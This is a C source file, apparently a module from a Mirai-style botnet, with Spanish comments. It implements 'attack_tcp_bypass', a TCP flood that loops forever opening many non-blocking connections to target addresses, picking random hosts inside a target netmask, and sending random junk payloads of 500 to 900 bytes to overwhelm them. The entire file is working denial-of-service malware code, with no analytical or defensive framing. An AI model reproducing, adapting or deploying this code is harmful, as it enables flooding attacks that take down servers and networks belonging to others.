#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/limits.h>
#include <linux/if_ether.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/epoll.h>
#include <stdio.h>
#include <stdlib.h>   // para malloc, rand
#include <string.h>   // para memcpy

// Headers del proyecto (con ruta relativa)
#include "../includes.h"
#include "../attack.h"
#include "../checksum.h"
#include "../rand.h"
#include "../util.h"

#define MAX_EPOLL_EVENTS 512
#define MAX_HTTP_SOCKETS 2000

void attack_tcp_bypass(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    uint16_t base_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 900);
    uint16_t port = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    
    // Si no se especifica puerto, usar aleatorio
    if (port == 0xffff)
        port = rand_next() & 0xffff;
    
    // Rango de longitud: mínimo 500, máximo base_len (si base_len < 500, usar 700)
    uint16_t min_len = 500;
    uint16_t max_len = (base_len < min_len) ? min_len + 200 : base_len;
    
    struct state {
        int fd;
        int state;
        uint32_t timeout;
    } states[MAX_FDS];
    
    // Inicializar estados
    for (int i = 0; i < MAX_FDS; i++) {
        states[i].fd = -1;
        states[i].state = 0;
        states[i].timeout = 0;
    }
    
    while (TRUE) {
        for (int i = 0; i < MAX_FDS; i++) {
            switch (states[i].state) {
                case 0: {
                    // Crear socket
                    if ((states[i].fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
                        continue;
                    
                    // Non-blocking
                    fcntl(states[i].fd, F_SETFL, O_NONBLOCK);
                    
                    // Elegir target (round robin sobre todos)
                    struct sockaddr_in addr;
                    addr.sin_family = AF_INET;
                    addr.sin_port = htons(port);
                    int target_idx = i % targs_len;
                    if (targs[target_idx].netmask < 32)
                        addr.sin_addr.s_addr = htonl(ntohl(targs[target_idx].addr) + (((uint32_t)rand_next()) >> targs[target_idx].netmask));
                    else
                        addr.sin_addr.s_addr = targs[target_idx].addr;
                    
                    errno = 0;
                    if (connect(states[i].fd, (struct sockaddr *)&addr, sizeof(addr)) == -1 && errno != EINPROGRESS) {
                        close(states[i].fd);
                        states[i].fd = -1;
                        continue;
                    }
                    states[i].state = 1;
                    states[i].timeout = time(NULL);
                    break;
                }
                case 1: {
                    fd_set write_set;
                    FD_ZERO(&write_set);
                    FD_SET(states[i].fd, &write_set);
                    struct timeval tv = {0, 10};
                    int ret = select(states[i].fd + 1, NULL, &write_set, NULL, &tv);
                    if (ret == 1) {
                        int err = 0;
                        socklen_t err_len = sizeof(err);
                        getsockopt(states[i].fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                        if (err) {
                            close(states[i].fd);
                            states[i].fd = -1;
                            states[i].state = 0;
                        } else {
                            states[i].state = 2;
                        }
                    } else if (ret == -1 || (states[i].timeout + 5 < time(NULL))) {
                        close(states[i].fd);
                        states[i].fd = -1;
                        states[i].state = 0;
                    }
                    break;
                }
                case 2: {
                    // Longitud aleatoria entre min_len y max_len
                    uint16_t len = min_len + (rand_next() % (max_len - min_len + 1));
                    char *buf = calloc(len, sizeof(char));
                    if (buf) {
                        rand_str(buf, len);
                        if (send(states[i].fd, buf, len, MSG_NOSIGNAL) == -1 && errno != EAGAIN) {
                            close(states[i].fd);
                            states[i].fd = -1;
                            states[i].state = 0;
                        }
                        free(buf);
                    }
                    break;
                }
            }
        }
    }
}